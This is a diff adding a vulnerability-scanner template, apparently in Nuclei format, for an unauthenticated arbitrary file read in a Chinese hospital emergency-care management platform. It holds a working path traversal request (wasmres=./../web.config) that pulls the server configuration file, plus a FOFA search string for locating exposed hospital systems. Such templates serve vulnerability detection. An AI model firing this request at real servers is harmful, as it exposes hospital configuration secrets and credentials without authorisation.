@@ -1,0 +1,31 @@
+id: schhsw-jizheng-ServicePage-fileread
+info:
+  name: 互慧软件急诊综合管理平台 ServicePage.aspx - fileread
+  author: leadlife
+  severity: high
+  description: 急诊综合管理平台 ServicePage.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%BA%92%E6%85%A7%E8%BD%AF%E4%BB%B6/%E6%80%A5%E8%AF%8A%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ServicePage.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/emis_lib/js/ThreeExtras.js"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,schhsw,hospital
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config"
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','configuration')
+        condition: and
